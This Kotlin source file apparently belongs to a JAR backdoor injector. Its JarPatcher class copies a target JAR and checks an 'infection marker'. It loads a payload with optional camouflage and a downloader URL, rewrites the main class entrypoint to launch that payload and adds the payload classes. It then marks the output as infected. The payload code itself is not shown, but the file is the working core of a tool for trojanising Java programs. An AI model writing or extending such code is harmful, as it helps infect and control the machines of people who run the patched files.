package com.tmquan2508.inject.core

import com.github.ajalt.mordant.rendering.TextColors.*
import com.tmquan2508.inject.config.Config
import com.tmquan2508.inject.core.analysis.JarAnalyzer
import com.tmquan2508.inject.core.analysis.JavaVersionScanner
import com.tmquan2508.inject.core.analysis.TargetJarInfo
import com.tmquan2508.inject.core.assembly.InfectionMarker
import com.tmquan2508.inject.core.assembly.JarAssembler
import com.tmquan2508.inject.core.patcher.MainClassPatcher
import com.tmquan2508.inject.core.payload.PayloadLoader
import com.tmquan2508.inject.core.payload.PayloadProcessor
import com.tmquan2508.inject.core.payload.ProcessedPayload
import com.tmquan2508.inject.log.BDLogger
import java.io.IOException
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.StandardCopyOption

internal class JarPatcher(
    private val inputPath: Path,
    private val outputPath: Path,
    private val camouflage: Boolean,
    private val config: Config,
    private val configJson: String,
    private val downloaderUrl: String,
    private val logger: BDLogger
) {
    private val infectionMarker = InfectionMarker(logger)
    private val jarAnalyzer = JarAnalyzer()
    private val versionScanner = JavaVersionScanner(logger)
    private val payloadLoader = PayloadLoader(logger)
    private val payloadProcessor = PayloadProcessor(logger)
    private val mainClassPatcher = MainClassPatcher()
    private val jarAssembler = JarAssembler(logger)

    fun patch(): Boolean {
        if (!Files.exists(inputPath)) {
            throw IOException("Input file does not exist: $inputPath")
        }

        logger.task("Patching ${inputPath.fileName}")
        val tempDir = Files.createTempDirectory("openbd_patch_")
        val tempJarPath = tempDir.resolve(inputPath.fileName)

        try {
            Files.copy(inputPath, tempJarPath, StandardCopyOption.REPLACE_EXISTING)

            logger.info("[STEP 1] Analyzing target JAR...")
            if (infectionMarker.isAlreadyPatched(tempJarPath)) {
                logger.finish().warn("Target is already patched. Skipping.")
                return false
            }
            val targetInfo = jarAnalyzer.analyze(tempJarPath)
            val dominantVersion = versionScanner.findDominantVersion(tempJarPath)
            logger.info(" -> Found main class: ${brightCyan(targetInfo.mainClassName)}")
            logger.info(" -> Dominant Java version: ${brightCyan("Major " + dominantVersion.major)} (e.g., Java ${dominantVersion.major - 44})")

            logger.info("[STEP 2] Processing payload...")
            val rawPayload = payloadLoader.loadDefault()
            val processedPayload = payloadProcessor.process(
                rawPayload,
                camouflage,
                tempJarPath.toFile(),
                dominantVersion,
                config,
                configJson,
                downloaderUrl
            )

            logger.info("[STEP 3] Patching main class entrypoint...")
            val modifiedMainClassBytes = mainClassPatcher.patch(
                targetInfo.mainClassBytes,
                processedPayload.finalMainPayloadName.replace('/', '.')
            )

            logger.info("[STEP 4] Assembling final JAR file...")
            jarAssembler.assemble(tempJarPath, modifiedMainClassBytes, targetInfo.mainClassPath, processedPayload)
            infectionMarker.set(tempJarPath)

            Files.copy(tempJarPath, outputPath, StandardCopyOption.REPLACE_EXISTING)
            logSummary(targetInfo, processedPayload)
            logger.finish().info("Successfully patched ${inputPath.fileName} -> ${green(outputPath.fileName.toString())}")
            return true

        } catch (e: Exception) {
            logger.finish().error("A critical error occurred while patching ${inputPath.fileName}: ${e.message}")
            logger.debug(e.stackTraceToString())
            throw e
        } finally {
            tempDir.toFile().deleteRecursively()
        }
    }

    private fun logSummary(targetInfo: TargetJarInfo, processedPayload: ProcessedPayload) {
        logger.info(" -> Summary of file changes:")
        logger.info("  ${yellow("MODIFIED:")} ${targetInfo.mainClassPath}")
        logger.info("  ${brightCyan("ADDED:")}    ${processedPayload.finalMainPayloadName.replace('/', '.')}.class")
        processedPayload.otherClasses.forEach { classFile ->
            logger.info("  ${brightCyan("ADDED:")}    ${classFile.name.replace('/', '.')}.class")
        }
    }
}